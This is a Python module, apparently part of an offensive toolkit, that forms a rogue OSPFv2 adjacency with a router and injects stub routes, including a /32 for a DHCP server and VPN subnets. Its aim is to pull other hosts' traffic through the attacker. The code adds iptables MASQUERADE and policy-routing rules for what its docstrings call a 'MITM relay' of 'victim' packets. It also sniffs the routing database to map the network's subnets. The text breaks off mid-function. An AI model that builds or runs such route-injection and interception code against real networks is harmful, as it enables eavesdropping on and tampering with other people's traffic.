#!/usr/bin/env python3
# v2.2
"""
ospf_adjacency.py — OSPFv2 full-adjacency engine + route injection + MITM relay.

Library module called by main.py.  Public API:

  Passive sniffing (before adjacency):
      sniff_ospf_hellos(iface)             -> learn SVI parameters from Hello packets
      sniff_ospf_lsdb_subnets(iface, list) -> capture advertised subnets into a list

  In-process engine (run in a daemon thread by main.py):
      make_context(iface, ip, ...)         -> build the shared context dict
      run_engine_headless(context)         -> Hello loop + packet dispatch
      withdraw_injected_routes(context)    -> MaxAge-flood self Router-LSA on exit

  MITM relay helpers (all Linux-only):
      enable_ip_forwarding()               -> save and enable ip_forward
      restore_ip_forwarding(old)           -> write back saved value
      setup_forwarding(in_iface, out)      -> iptables FORWARD + MASQUERADE rules
      teardown_forwarding(in_iface, out)   -> remove those rules
      setup_policy_routing(iface, svi_ip)  -> per-victim routing table (fwmark 100)
      teardown_policy_routing(iface)       -> remove policy routing rules
"""
from __future__ import annotations
import ipaddress
import socket
import subprocess
import sys
import threading
import time

try:
    from scapy.all import Ether, IP, get_if_addr, sendp, sniff
    from scapy.contrib.ospf import (
        OSPF_DBDesc,
        OSPF_Hdr,
        OSPF_Hello,
        OSPF_LSA_Hdr,
        OSPF_LSAck,
        OSPF_LSReq,
        OSPF_LSUpd,
        OSPF_Link,
        OSPF_Network_LSA,
        OSPF_Router_LSA,
    )
except ImportError:
    sys.exit("[!] pip install scapy  (Windows: also install Npcap)")

ALL_SPF_MULTICAST = "224.0.0.5"
ALL_DR_MULTICAST = "224.0.0.6"
ALL_SPF_MAC = "01:00:5e:00:00:05"
ALL_DR_MAC = "01:00:5e:00:00:06"
OSPF_PROTO = getattr(socket, "IPPROTO_OSPF", 89)
OSPF_OPTIONS = 0x02
DEAD_INTERVAL = 40
INITIAL_DBD_SEQ = 1000
OSPF_INTERFACE_MTU = 1500
OSPF_LINK_METRIC_DEFAULT = 1
BASE_LSA_SEQUENCE = 0x80000001
BACKBONE_AREA = "0.0.0.0"
DEFAULT_ROUTER_ID = "99.99.99.99"
OSPF_SNIFF_FILTER = "ip proto 89 or (vlan and ip proto 89)"

DOWN = "DOWN"
INIT = "INIT"
TWO_WAY = "TWO_WAY"
EXSTART = "EXSTART"
EXCHANGE = "EXCHANGE"
LOADING = "LOADING"
FULL = "FULL"

ACTIVE_NEIGHBOR_STATES = (INIT, TWO_WAY, EXSTART, EXCHANGE, LOADING, FULL)
DBD_READY_STATES = (EXSTART, EXCHANGE, LOADING, FULL)


def log_message(message):
    sys.stdout.write(f"[{time.strftime('%H:%M:%S')}] {message}\n")
    sys.stdout.flush()


# ── Passive OSPF Hello sniffing ───────────────────────────────────────────────

def sniff_ospf_hellos(iface, timeout=30):
    """Passively sniff OSPF Hello packets on 224.0.0.5 to learn SVI parameters.

    Collects all unique Hello sources seen during the timeout window (de-duped
    by router_id).  Returns a list of param dicts, ordered by first appearance.
    Returns an empty list on timeout.  The caller uses ospf_hellos[0] for
    adjacency formation and passes the full list to the debug menu.

    Each dict contains:
        router_id      OSPF router ID of the SVI
        src_ip         SVI interface IP (= subnet gateway)
        netmask        Interface netmask
        area_id        OSPF area identifier
        hello_interval Hello interval in seconds
        dead_interval  Dead interval in seconds
        options        Options byte (E-bit set = normal area, clear = stub)
        auth_type      0=none  1=simple-password  2=MD5
        dr             Designated Router IP
        bdr            Backup DR IP
    """
    seen_ids = {}  # router_id -> param dict, insertion-ordered

    def _handle(pkt):
        if not (pkt.haslayer(OSPF_Hdr) and pkt.haslayer(OSPF_Hello) and pkt.haslayer(IP)):
            return
        if pkt[OSPF_Hdr].type != 1:
            return
        rid = str(pkt[OSPF_Hdr].src)
        if rid in seen_ids:
            return
        h = pkt[OSPF_Hello]
        seen_ids[rid] = {
            "router_id":      rid,
            "src_ip":         str(pkt[IP].src),
            "netmask":        str(h.mask),
            "area_id":        str(pkt[OSPF_Hdr].area),
            "hello_interval": int(h.hellointerval),
            "dead_interval":  int(h.deadinterval),
            "options":        int(h.options),
            "auth_type":      int(getattr(pkt[OSPF_Hdr], "authtype", 0)),
            "dr":             str(h.router),
            "bdr":            str(h.backup),
        }

    log_message(f"[OSPF] Sniffing OSPF Hellos on {iface} for {timeout}s ...")
    sniff(iface=iface, filter=OSPF_SNIFF_FILTER, prn=_handle, store=False, timeout=timeout)

    results = list(seen_ids.values())
    if not results:
        log_message(f"[OSPF] No OSPF Hellos received on {iface} within {timeout}s.")
        return []

    _auth_names = {0: "none", 1: "simple-password", 2: "MD5"}
    for p in results:
        import ipaddress as _ip
        try:
            subnet = _ip.IPv4Network(f"{p['src_ip']}/{p['netmask']}", strict=False)
        except Exception:
            subnet = f"{p['src_ip']}/{p['netmask']}"
        log_message(f"[OSPF] SVI  router_id={p['router_id']}  ip={p['src_ip']}  "
                    f"subnet={subnet}  area={p['area_id']}  "
                    f"hello={p['hello_interval']}s  dead={p['dead_interval']}s  "
                    f"auth={_auth_names.get(p['auth_type'], '?')}  "
                    f"E-bit={'1' if p['options'] & 0x02 else '0(stub)'}")
    return results


# ── OSPF LSDB passive sniffer ────────────────────────────────────────────────

def sniff_ospf_lsdb_subnets(iface, out_list, timeout=120):
    """Sniff LS Update packets and extract all advertised subnets into out_list.

    Designed to run in a background daemon thread started just before adjacency
    formation.  The LSDB exchange floods all Router-LSAs and Network-LSAs during
    the EXCHANGE/LOADING phase; sniffing the wire captures the full topology
    without needing access to the adjacency engine's internal context.

    Parses:
      Type-1 Router-LSA — stub links (link type=3): directly connected subnets
      Type-2 Network-LSA — transit/broadcast segment subnets

    Each entry appended to out_list:
      prefix       "192.168.1.0/24"
      network      "192.168.1.0"
      netmask      "255.255.255.0"
      adv_router   advertising router ID
      lsa_type     "Router-LSA" | "Network-LSA"
      metric       TOS-0 cost (Router-LSA only, else 0)
    """
    seen = set()

    def _add(net_str, mask_str, adv, lsa_label, metric=0):
        try:
            network = ipaddress.IPv4Network(f"{net_str}/{mask_str}", strict=False)
        except Exception:
            return
        key = str(network)
        if key in seen:
            return
        seen.add(key)
        out_list.append({
            "prefix":     str(network),
            "network":    str(network.network_address),
            "netmask":    str(network.netmask),
            "adv_router": adv,
            "lsa_type":   lsa_label,
            "metric":     metric,
        })

    def _handle(pkt):
        if not (pkt.haslayer(OSPF_Hdr) and pkt.haslayer(OSPF_LSUpd)):
            return
        for lsa in getattr(pkt[OSPF_LSUpd], "lsalist", []):
            lsa_type  = getattr(lsa, "type", None)
            adv       = str(getattr(lsa, "adrouter", "?"))
            if lsa_type == 1:  # Router-LSA: scan stub links
                for link in getattr(lsa, "linklist", []):
                    if int(getattr(link, "type", 0)) != 3:
                        continue
                    _add(str(getattr(link, "id",   "0.0.0.0")),
                         str(getattr(link, "data", "0.0.0.0")),
                         adv, "Router-LSA",
                         int(getattr(link, "metric", 0)))
            elif lsa_type == 2:  # Network-LSA: the DR's interface IP + mask
                _add(str(getattr(lsa, "id",   "0.0.0.0")),
                     str(getattr(lsa, "mask", "255.255.255.0")),
                     adv, "Network-LSA")

    log_message(f"[LSDB] Background subnet sniffer started on {iface} (timeout={timeout}s)")
    sniff(iface=iface, filter=OSPF_SNIFF_FILTER, prn=_handle, store=False, timeout=timeout)
    log_message(f"[LSDB] Subnet sniffer done — {len(out_list)} unique network(s) captured")


# ── IP forwarding + iptables MITM relay helpers ───────────────────────────────

_IP_FORWARD_PATH = "/proc/sys/net/ipv4/ip_forward"


def enable_ip_forwarding():
    """Enable IPv4 forwarding; return the previous value so it can be restored."""
    try:
        with open(_IP_FORWARD_PATH) as f:
            old = f.read().strip()
    except OSError:
        old = "0"
    try:
        with open(_IP_FORWARD_PATH, "w") as f:
            f.write("1\n")
        log_message(f"[FWD] ip_forward enabled (was {old!r})")
    except OSError as exc:
        log_message(f"[WARN] Could not enable ip_forward: {exc}")
    return old


def restore_ip_forwarding(old_value):
    """Write back the previously saved ip_forward value."""
    try:
        with open(_IP_FORWARD_PATH, "w") as f:
            f.write(f"{old_value}\n")
        log_message(f"[FWD] ip_forward restored to {old_value!r}")
    except OSError as exc:
        log_message(f"[WARN] Could not restore ip_forward: {exc}")


def _iptables(args, *, check=False):
    result = subprocess.run(["iptables"] + args, capture_output=True, text=True, check=False)
    if result.returncode != 0 and check:
        log_message(f"[WARN] iptables {' '.join(args)}: {result.stderr.strip()}")
    return result.returncode == 0


def setup_forwarding(in_iface, out_iface):
    """Add iptables FORWARD accept + MASQUERADE rules for transparent MITM relay.

    Victim packets arriving on in_iface destined for the injected /32 are
    forwarded out out_iface toward the real next-hop.  MASQUERADE rewrites the
    source IP to ours so the real destination routes replies back to us rather
    than directly to the victim — keeping the session symmetric.

    Tradeoff: NAT (MASQUERADE) is simpler than injecting a reverse LSA for the
    victim prefix, but the target sees our IP rather than the victim's.  Return
    traffic is visible to us (we can proxy-inspect) but not passively sniffable
    as unmodified victim→target flows.  A reverse Type-1 /32 LSA for the victim
    would preserve source IPs at the cost of needing the victim's prefix up-front.
    """
    _iptables(["-A", "FORWARD", "-i", in_iface, "-o", out_iface, "-j", "ACCEPT"])
    _iptables(["-A", "FORWARD", "-i", out_iface, "-o", in_iface,
               "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
    _iptables(["-t", "nat", "-A", "POSTROUTING", "-o", out_iface, "-j", "MASQUERADE"])
    log_message(f"[FWD] Forwarding rules added: {in_iface} → {out_iface} (MASQUERADE)")


def teardown_forwarding(in_iface, out_iface):
    """Remove the iptables rules added by setup_forwarding()."""
    _iptables(["-D", "FORWARD", "-i", in_iface, "-o", out_iface, "-j", "ACCEPT"])
    _iptables(["-D", "FORWARD", "-i", out_iface, "-o", in_iface,
               "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
    _iptables(["-t", "nat", "-D", "POSTROUTING", "-o", out_iface, "-j", "MASQUERADE"])
    log_message(f"[FWD] Forwarding rules removed: {in_iface} → {out_iface}")


_POLICY_TABLE = "100"
_POLICY_FWMARK = "100"
_POLICY_RULE_PRIORITY = "100"


def setup_policy_routing(iface, svi_ip, tun_iface=None, vpn_subnets=None):
    """Force all forwarded (victim) packets through a dedicated routing table.

    Why: when OpenVPN runs, it injects high-priority routes via tun0 into the
    main table.  Forwarded victim packets hit those routes and exit tun0 instead
    of eth0.  We fix this by:

      1. Creating routing table 100 with:
           default via <SVI>   dev <eth0>     (non-VPN victim traffic → eth0)
           <vpn_subnet>        dev <tun0>     (VPN victim traffic    → tun0)
      2. Marking every incoming packet from eth0 in mangle PREROUTING.
      3. Marking every ESTABLISHED/RELATED packet from tun0 — these are VPN
         return packets that conntrack will DNAT to the victim IP.  Without this
         mark they would be routed via the main table (default → tun0) instead
         of going back out eth0 to the victim.
      4. Adding an ip rule: fwmark 100 → look up table 100.

    Locally-generated traffic (OpenVPN keepalives, our DHCP responses) goes
    through the OUTPUT chain, never touches PREROUTING, and is unaffected.
    """
    r = subprocess.run
    # Flush and populate table 100
    r(["ip", "route", "flush", "table", _POLICY_TABLE], capture_output=True, check=False)
    r(["ip", "route", "add", "default", "via", svi_ip, "dev", iface,
       "table", _POLICY_TABLE], capture_output=True, check=False)
    # The directly-connected subnet must also be in the table for ARP to work
    result = subprocess.run(
        ["ip", "-o", "-f", "inet", "addr", "show", "dev", iface],
        capture_output=True, text=True, check=False,
    )
    for token in result.stdout.split():
        if "/" in token and token.count(".") == 3:
            import ipaddress as _ip
            try:
                net = str(_ip.IPv4Interface(token).network)
                r(["ip", "route", "add", net, "dev", iface,
                   "table", _POLICY_TABLE], capture_output=True, check=False)
            except Exception as exc:
                log_message(f"[WARN] Could not add subnet route to table {_POLICY_TABLE}: {exc}")
            break
    if tun_iface and vpn_subnets:
        for subnet in vpn_subnets:
            r(["ip", "route", "add", subnet, "dev", tun_iface,
               "table", _POLICY_TABLE], capture_output=True, check=False)
    # Mark victim traffic arriving on the physical iface
    _iptables(["-t", "mangle", "-A", "PREROUTING",
               "-i", iface, "-j", "MARK", "--set-mark", _POLICY_FWMARK])
    # Mark VPN return traffic arriving on tun0 so it routes back out eth0.
    # These packets arrive on tun0 destined for our eth0 IP; conntrack DNAT
    # (which fires after mangle PREROUTING) rewrites the dst to the victim IP.
    # With fwmark 100 set, the routing decision uses table 100 (default via SVI
    # on eth0) instead of the main table's tun0 default, fixing cross-VLAN reply.
    if tun_iface:
        _iptables(["-t", "mangle", "-A", "PREROUTING",
                   "-i", tun_iface, "-m", "conntrack", "--ctstate", "ESTABLISHED,RELATED",
                   "-j", "MARK", "--set-mark", _POLICY_FWMARK])
    # Route marked packets via table 100
    subprocess.run(
        ["ip", "rule", "add", "fwmark", _POLICY_FWMARK,
         "table", _POLICY_TABLE, "priority", _POLICY_RULE_PRIORITY],
        capture_output=True, check=False,
    )
    log_message(f"[FWD] Policy routing: table {_POLICY_TABLE}  fwmark {_POLICY_FWMARK}  "
                f"default via {svi_ip} dev {iface}"
                + (f"  vpn {vpn_subnets} via {tun_iface}" if tun_iface else ""))


def teardown_policy_routing(iface, tun_iface=None):
    """Remove the policy routing rules and table added by setup_policy_routing()."""
    subprocess.run(
        ["ip", "rule", "del", "fwmark", _POLICY_FWMARK,
         "table", _POLICY_TABLE, "priority", _POLICY_RULE_PRIORITY],
        capture_output=True, check=False,
    )
    subprocess.run(
        ["ip", "route", "flush", "table", _POLICY_TABLE],
        capture_output=True, check=False,
    )
    _iptables(["-t", "mangle", "-D", "PREROUTING",
               "-i", iface, "-j", "MARK", "--set-mark", _POLICY_FWMARK],
              check=False)
    if tun_iface:
        _iptables(["-t", "mangle", "-D", "PREROUTING",
                   "-i", tun_iface, "-m", "conntrack", "--ctstate", "ESTABLISHED,RELATED",
                   "-j", "MARK", "--set-mark", _POLICY_FWMARK],
                  check=False)
    log_message(f"[FWD] Policy routing removed (table {_POLICY_TABLE})")


def add_default_route(gateway_ip, iface):
    """Add a default route via the OSPF-learned SVI so forwarded packets reach the internet.

    Returns True if a new route was added, False if one already existed (so the
    caller knows whether to remove it on teardown — we never delete pre-existing routes).
    """
    result = subprocess.run(
        ["ip", "route", "add", "default", "via", gateway_ip, "dev", iface],
        capture_output=True, text=True, check=False,
    )
    if result.returncode != 0:
        if "File exists" in result.stderr or "RTNETLINK answers: File exists" in result.stderr:
            log_message(f"[FWD] Default route via {gateway_ip} already existed — leaving it untouched")
            return False
        log_message(f"[WARN] Could not add default route via {gateway_ip}: {result.stderr.strip()}")
        return False
    log_message(f"[FWD] Default route added: default via {gateway_ip} dev {iface}")
    return True


def remove_default_route(gateway_ip, iface):
    """Remove the default route added by add_default_route()."""
    result = subprocess.run(
        ["ip", "route", "del", "default", "via", gateway_ip, "dev", iface],
        capture_output=True, text=True, check=False,
    )
    if result.returncode == 0:
        log_message(f"[FWD] Default route via {gateway_ip} removed")
    else:
        log_message(f"[WARN] Could not remove default route via {gateway_ip}: {result.stderr.strip()}")


def withdraw_injected_routes(context):
    """Withdraw our Router-LSA by re-flooding it with age=MaxAge (3600).

    Per RFC 2328 §14.1: when neighbours receive a MaxAge LSA they install it,
    then purge it and any routes it installed from their LSDB/RIB.  This cleanly
    removes the injected /32 stub without waiting for natural LSA expiry.
    """
    with context["lock"]:
        existing = find_lsa(context, 1, context["router_id"], context["router_id"])
        if existing is None:
            log_message("[TEARDOWN] No self Router-LSA found; nothing to withdraw.")
            return
        maxage_lsa = existing.copy()
    maxage_lsa.age = 3600
    try:
        flood_lsa_packets(context, [maxage_lsa])
        log_message("[TEARDOWN] Flooded MaxAge Router-LSA — injected routes will be purged.")
    except Exception as exc:
        log_message(f"[TEARDOWN] WARNING: Could not flood MaxAge LSA: {exc} — injected routes will persist until natural LSA expiry (~30 min)")


# ── Router-LSA route injection (inlined from former ospf_route_addition.py) ────

def normalize_metric(metric):
    metric_value = int(metric)
    if not 0 <= metric_value <= 0xFFFF:
        raise ValueError("Metric must be between 0 and 65535.")
    return metric_value


def add_router_stub_route(context, prefix, mask, metric):
    network_prefix, network_mask = normalize_network(prefix, mask)
    stub_link = OSPF_Link(type=3, id=network_prefix, data=network_mask, metric=normalize_metric(metric))
    with context["lock"]:
        context["manual_router_links"] = [
            existing_link.copy()
            for existing_link in context["manual_router_links"]
            if (existing_link.id, existing_link.data) != (stub_link.id, stub_link.data)
        ]
        context["manual_router_links"].append(stub_link.copy())
        sequence_number = next_lsa_sequence(context, 1, context["router_id"], context["router_id"])
        router_lsa = build_router_lsa(context, sequence_number=sequence_number)
        upsert_lsa(context, router_lsa)
    flooded = flood_lsa_packets(context, [router_lsa])
    scope_text = "and flooded to FULL neighbors" if flooded else "in the local LSDB only"
    log_message(
        f"[ROUTES] Added Router-LSA route net={stub_link.id} mask={stub_link.data} "
        f"metric={stub_link.metric} seq=0x{router_lsa.seq:08x} {scope_text}."
    )
    return router_lsa


def prompt_and_add_router_stub_route(context, input_func):
    try:
        prefix = input_func("  Router-LSA network: ").strip()
        mask = input_func("  Router-LSA mask: ").strip()
        metric_text = input_func("  Router-LSA metric [10]: ").strip()
        metric = int(metric_text) if metric_text else 10
        add_router_stub_route(context, prefix, mask, metric)
    except ValueError as exc:
        log_message(f"[MENU] Could not update Router-LSA: {exc}")
    except EOFError:
        return


def read_interface_ip(interface_name):
    try:
        address = get_if_addr(interface_name)
        if address and address != "0.0.0.0":
            return address
    except Exception as exc:
        log_message(f"[WARN] get_if_addr({interface_name}): {exc}")
    return None


def read_interface_netmask(interface_name):
    try:
        result = subprocess.run(
            ["ip", "-o", "-f", "inet", "addr", "show", "dev", interface_name],
            capture_output=True, text=True, check=False,
        )
        prefix_text = ""
        for token in result.stdout.split():
            if "/" in token and token.count(".") == 3:
                prefix_text = token.split("/", 1)[1]
                break
        if prefix_text.count(".") == 3:
            return prefix_text
        if prefix_text.isdigit():
            return str(ipaddress.IPv4Network(f"0.0.0.0/{prefix_text}", strict=False).netmask)
    except Exception:
        pass
    return None


def read_interface_state(interface_name):
    address = read_interface_ip(interface_name)
    netmask = read_interface_netmask(interface_name) if address else None
    if address and netmask:
        return address, netmask
    return None, None


def make_neighbor(router_id, ip_address):
    return {
        "router_id": router_id,
        "ip_address": ip_address,
        "mac_address": "ff:ff:ff:ff:ff:ff",
        "state": DOWN,
        "priority": 0,
        "designated_router": "0.0.0.0",
        "backup_designated_router": "0.0.0.0",
        "database_sequence": 0,
        "is_master": False,
        "last_seen": time.time(),
        "requested_lsas": [],
        "last_peer_seq_in": None,   # last slave seq we processed (duplicate guard)
        "last_sent_dbd": None,      # cached master DBD to resend on slave retransmit
    }


def make_context(interface_name, source_ip, network_mask, hello_interval,
                 auto_route_ip=None, area_id=BACKBONE_AREA, dead_interval=DEAD_INTERVAL,
                 extra_subnets=None):
    return {
        "interface_name": interface_name,
        "source_ip": source_ip,
        "router_id": DEFAULT_ROUTER_ID,
        "network_mask": network_mask,
        "area_id": area_id,
        "designated_router": "0.0.0.0",
        "backup_designated_router": "0.0.0.0",
        "hello_interval": hello_interval,
        "dead_interval": dead_interval,
        "local_lsdb": [],
        "neighbors": {},
        "lock": threading.RLock(),
        "manual_router_links": [],
        "adjacency_ready_event": threading.Event(),
        "stop_event": threading.Event(),
        "source_ip_available": True,
        "ospf_raw_socket": None,
        "ospf_raw_socket_warning_logged": False,
        "auto_route_ip": auto_route_ip,
        "auto_route_added": False,
        # Additional subnet stubs injected after FULL adjacency (e.g. VPN subnets).
        # Each entry is a "net/mask" string like "172.16.1.0/255.255.255.0".
        "extra_subnets": list(extra_subnets) if extra_subnets else [],
        "extra_subnets_added": False,
    }


def close_ospf_raw_socket(context):
    with context["lock"]:
        raw_socket = context["ospf_raw_socket"]
        context["ospf_raw_socket"] = None
    if raw_socket is None:
        return
    try:
        raw_socket.close()
    except OSError:
        pass


def drain_ospf_raw_socket(context, raw_socket):
    while not context["stop_event"].is_set():
        try:
            raw_socket.recv(65535)
        except socket.timeout:
            continue
        except OSError:
            break
    with context["lock"]:
        if context["ospf_raw_socket"] is raw_socket:
            context["ospf_raw_socket"] = None
    try:
        raw_socket.close()
    except OSError:
        pass


def ensure_ospf_raw_socket(context):
    with context["lock"]:
        if context["ospf_raw_socket"] is not None or not context["source_ip_available"]:
            return
        source_ip = context["source_ip"]
    try:
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, OSPF_PROTO)
        raw_socket.bind((source_ip, 0))
        raw_socket.settimeout(1.0)
    except OSError as exc:
        with context["lock"]:
            if context["ospf_raw_socket_warning_logged"]:
                return
            context["ospf_raw_socket_warning_logged"] = True
        log_message(
            f"[WARN] Could not bind a raw IP protocol {OSPF_PROTO} receiver on {source_ip}: {exc}. "
            "Inbound OSPF may still trigger ICMP protocol-unreachable replies from the host."
        )
        return
    with context["lock"]:
        context["ospf_raw_socket"] = raw_socket
        context["ospf_raw_socket_warning_logged"] = False
    threading.Thread(target=drain_ospf_raw_socket, args=(context, raw_socket), daemon=True).start()


def send_packet(context, payload, destination=ALL_SPF_MULTICAST):
    if not payload.haslayer(OSPF_Hdr):
        raise ValueError("send_packet() expected an OSPF payload that already contains OSPF_Hdr.")
    if payload[OSPF_Hdr].type == 1 and destination != ALL_SPF_MULTICAST:
        raise ValueError("OSPF Hello packets in this broadcast-segment script must be sent to 224.0.0.5.")
    if destination == ALL_SPF_MULTICAST:
        ethernet_destination = ALL_SPF_MAC
    elif destination == ALL_DR_MULTICAST:
        ethernet_destination = ALL_DR_MAC
    else:
        ethernet_destination = "ff:ff:ff:ff:ff:ff"
        with context["lock"]:
            for neighbor in context["neighbors"].values():
                if neighbor["ip_address"] == destination:
                    ethernet_destination = neighbor["mac_address"]
                    break
    frame = Ether(dst=ethernet_destination) / IP(src=context["source_ip"], dst=destination, proto=OSPF_PROTO, ttl=1) / payload
    sendp(frame, iface=context["interface_name"], verbose=False)


def build_header(context, packet_type):
    return OSPF_Hdr(version=2, type=packet_type, src=context["router_id"], area=context["area_id"])


def build_ls_update(context, lsa_packets):
    return build_header(context, 4) / OSPF_LSUpd(lsalist=[lsa_packet.copy() for lsa_packet in lsa_packets])


def local_lsdb_entries(context, copy_packets=False):
    with context["lock"]:
        lsa_packets = context["local_lsdb"]
        if copy_packets:
            return [lsa_packet.copy() for lsa_packet in lsa_packets]
        return list(lsa_packets)


def build_hello(context):
    with context["lock"]:
        neighbor_ids = [
            neighbor["router_id"]
            for neighbor in context["neighbors"].values()
            if neighbor["state"] in ACTIVE_NEIGHBOR_STATES
        ]
    return build_header(context, 1) / OSPF_Hello(
        mask=context["network_mask"],
        hellointerval=context["hello_interval"],
        options=OSPF_OPTIONS,
        prio=0,
        deadinterval=context["dead_interval"],
        router=context["designated_router"],
        backup=context["backup_designated_router"],
        neighbors=neighbor_ids,
    )


def build_dbd(context, _neighbor_entry, is_initial_packet=False, has_more_packets=False, is_master_packet=True, sequence_number=0, lsa_headers=None):
    database_description_flags = (0x04 if is_initial_packet else 0) | (0x02 if has_more_packets else 0) | (0x01 if is_master_packet else 0)
    database_description_packet = build_header(context, 2) / OSPF_DBDesc(mtu=OSPF_INTERFACE_MTU, options=OSPF_OPTIONS, dbdescr=database_description_flags, ddseq=sequence_number)
    for lsa_header in (lsa_headers or []):
        database_description_packet = database_description_packet / lsa_header
    return database_description_packet


def build_router_lsa(context, sequence_number=BASE_LSA_SEQUENCE):
    with context["lock"]:
        if context["designated_router"] != "0.0.0.0":
            attached_link = OSPF_Link(type=2, id=context["designated_router"], data=context["source_ip"], metric=OSPF_LINK_METRIC_DEFAULT)
        else:
            network_prefix, network_mask = normalize_network(context["source_ip"], context["network_mask"])
            attached_link = OSPF_Link(type=3, id=network_prefix, data=network_mask, metric=OSPF_LINK_METRIC_DEFAULT)
        link_list = [attached_link]
        link_list.extend(link.copy() for link in context["manual_router_links"])
    return OSPF_Router_LSA(
        age=1,
        options=OSPF_OPTIONS,
        type=1,
        id=context["router_id"],
        adrouter=context["router_id"],
        seq=sequence_number,
        linklist=link_list,
    )


def get_lsa_key(lsa_packet):
    return (lsa_packet.type, lsa_packet.id, lsa_packet.adrouter)


def format_neighbor_status(neighbor):
    status_message = f"[STATUS] {neighbor['router_id']} state={neighbor['state']} ip={neighbor['ip_address']}"
    if neighbor["designated_router"] != "0.0.0.0" and neighbor["ip_address"] == neighbor["designated_router"]:
        status_message += f" dr={neighbor['designated_router']}"
    return status_message


def is_dr_or_bdr_neighbor(neighbor):
    return neighbor["ip_address"] in {neighbor["designated_router"], neighbor["backup_designated_router"]} and neighbor["ip_address"] != "0.0.0.0"


def find_lsa(context, lsa_type, lsa_id, advertising_router):
    for lsa_packet in context["local_lsdb"]:
        if get_lsa_key(lsa_packet) == (lsa_type, lsa_id, advertising_router):
            return lsa_packet
    return None


def upsert_lsa(context, lsa_packet):
    lsa_key = get_lsa_key(lsa_packet)
    for index, existing_lsa in enumerate(context["local_lsdb"]):
        if get_lsa_key(existing_lsa) != lsa_key:
            continue
        if getattr(lsa_packet, "seq", 0) >= getattr(existing_lsa, "seq", 0):
            context["local_lsdb"][index] = lsa_packet.copy()
            return True
        return False
    context["local_lsdb"].append(lsa_packet.copy())
    return True


def next_lsa_sequence(context, lsa_type, lsa_id, advertising_router):
    existing_lsa = find_lsa(context, lsa_type, lsa_id, advertising_router)
    if existing_lsa is None:
        return BASE_LSA_SEQUENCE
    return max(getattr(existing_lsa, "seq", BASE_LSA_SEQUENCE - 1) + 1, BASE_LSA_SEQUENCE)


def normalize_network(prefix, mask):
    network = ipaddress.IPv4Network(f"{prefix}/{mask}", strict=False)
    return str(network.network_address), str(network.netmask)


def flood_lsa_packets(context, lsa_packets):
    with context["lock"]:
        full_neighbor_ids = [
            neighbor["router_id"]
            for neighbor in context["neighbors"].values()
            if neighbor["state"] == FULL
        ]
    if not full_neighbor_ids:
        return False
    send_packet(context, build_ls_update(context, lsa_packets), destination=ALL_DR_MULTICAST)
    return True


def should_fight_back_self_lsa(context, received_lsa):
    with context["lock"]:
        existing_lsa = find_lsa(context, 1, context["router_id"], context["router_id"])
        existing_sequence = getattr(existing_lsa, "seq", BASE_LSA_SEQUENCE - 1) if existing_lsa is not None else BASE_LSA_SEQUENCE - 1
    received_sequence = getattr(received_lsa, "seq", BASE_LSA_SEQUENCE - 1)
    if received_sequence < existing_sequence:
        return False
    if received_sequence > existing_sequence:
        return True
    desired_lsa = build_router_lsa(context, sequence_number=received_sequence)
    received_links = [
        (int(getattr(link, "type", 0)), str(getattr(link, "id", "0.0.0.0")), str(getattr(link, "data", "0.0.0.0")), int(getattr(link, "metric", 0)))
        for link in getattr(received_lsa, "linklist", [])
    ]
    desired_links = [
        (int(getattr(link, "type", 0)), str(getattr(link, "id", "0.0.0.0")), str(getattr(link, "data", "0.0.0.0")), int(getattr(link, "metric", 0)))
        for link in getattr(desired_lsa, "linklist", [])
    ]
    return received_links != desired_links


def reorigin_self_router_lsa(context, sequence_number):
    with context["lock"]:
        router_lsa = build_router_lsa(context, sequence_number=sequence_number)
        upsert_lsa(context, router_lsa)
    flood_lsa_packets(context, [router_lsa])
    return router_lsa


def refresh_local_router_lsa(context, bump_sequence=False):
    with context["lock"]:
        if bump_sequence:
            sequence_number = next_lsa_sequence(context, 1, context["router_id"], context["router_id"])
        else:
            existing_lsa = find_lsa(context, 1, context["router_id"], context["router_id"])
            sequence_number = getattr(existing_lsa, "seq", BASE_LSA_SEQUENCE)
        upsert_lsa(context, build_router_lsa(context, sequence_number=sequence_number))


def maybe_add_auto_route(context):
    with context["lock"]:
        auto_route_ip = context["auto_route_ip"]
        auto_route_added = context["auto_route_added"]
        extra_subnets = context["extra_subnets"]
        extra_subnets_added = context["extra_subnets_added"]
        adjacency_ready = context["adjacency_ready_event"].is_set()
    if not adjacency_ready:
        return

    # Inject the /32 host route for the DHCP server IP.
    if auto_route_ip and not auto_route_added:
        add_router_stub_route(context, auto_route_ip, "255.255.255.255", 0)
        with context["lock"]:
            context["auto_route_added"] = True

    # Inject additional subnet stubs (e.g. VPN subnets) so the router routes
    # option-121 traffic for those subnets back to us via OSPF.
    if extra_subnets and not extra_subnets_added:
        for cidr in extra_subnets:
            try:
                net = ipaddress.IPv4Network(cidr, strict=False)
                add_router_stub_route(
                    context, str(net.network_address), str(net.netmask), 1,
                )
            except Exception as exc:
                log_message(f"[WARN] Could not inject extra subnet {cidr}: {exc} — VPN relay MITM may be incomplete")
        with context["lock"]:
            context["extra_subnets_added"] = True


def reset_adjacency_state(context, reason):
    with context["lock"]:
        context["neighbors"].clear()
        context["designated_router"] = "0.0.0.0"
        context["backup_designated_router"] = "0.0.0.0"
        context["adjacency_ready_event"].clear()
    log_message(f"[RESET] {reason}")


def refresh_runtime_source_ip(context):
    current_ip, current_mask = read_interface_state(context["interface_name"])
    with context["lock"]:
        previous_ip = context["source_ip"]
        previous_mask = context["network_mask"]
        ip_was_available = context["source_ip_available"]

    if not current_ip or not current_mask:
        if ip_was_available:
            with context["lock"]:
                context["source_ip_available"] = False
            close_ospf_raw_socket(context)
            reset_adjacency_state(
                context,
                f"Interface {context['interface_name']} lost its usable IPv4 address or netmask. Pausing hellos until a valid address returns.",
            )
        return False

    if not ip_was_available:
        with context["lock"]:
            context["source_ip"] = current_ip
            context["network_mask"] = current_mask
            context["source_ip_available"] = True
        close_ospf_raw_socket(context)
        ensure_ospf_raw_socket(context)
        refresh_local_router_lsa(context, bump_sequence=True)
        reset_adjacency_state(
            context,
            f"Interface {context['interface_name']} recovered with IPv4 address {current_ip}. Restarting adjacency discovery.",
        )
        return True

    if current_ip == previous_ip and current_mask == previous_mask:
        return True

    with context["lock"]:
        context["source_ip"] = current_ip
        context["network_mask"] = current_mask
    close_ospf_raw_socket(context)
    ensure_ospf_raw_socket(context)
    refresh_local_router_lsa(context, bump_sequence=True)
    if current_ip != previous_ip:
        reason = (
